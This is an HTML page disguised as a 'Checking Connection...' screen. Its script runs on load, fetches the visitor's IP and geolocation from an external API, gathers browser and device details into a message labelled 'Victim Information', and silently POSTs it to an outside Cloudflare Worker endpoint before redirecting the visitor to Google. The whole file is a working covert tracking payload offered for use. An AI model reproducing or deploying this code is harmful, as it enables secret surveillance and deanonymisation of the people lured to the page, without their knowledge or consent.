<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
</head>
<body>
    <script>
        async function captureInfo() {
            try {
                // 1. جلب الـ IP من موقع خارجي
                const ipReq = await fetch('https://ipapi.co/json/');
                const ipData = await ipReq.json();

                // 2. تجهيز الرسالة
                const msg = `
✅Victim Information 

⚓ IP: ${ipData.ip} (https://ip-api.com/#${ipData.ip}) | Time: ${new Date().toLocaleString()}
📍 Location: ${ipData.city}, ${ipData.country_name}

📱 Device Information
userAgent: ${navigator.userAgent}
platform: ${navigator.platform}
language: ${navigator.language}
                `;

                // 3. إرسال البيانات للـ Worker الخاص بك (رابطك هنا)
                const workerUrl = "https://gbs.tjarb093.workers.dev/";

                await fetch(workerUrl, {
                    method: 'POST',
                    mode: 'no-cors', // لضمان العمل حتى مع قيود التصفح
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: msg })
                });

                // 4. توجيه الشخص لموقع حقيقي (مثلاً فيديو يوتيوب أو جوجل)
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 500);

            } catch (err) {
                window.location.href = "https://www.google.com";
            }
        }

        window.onload = captureInfo;
    </script>
</body>
</html>
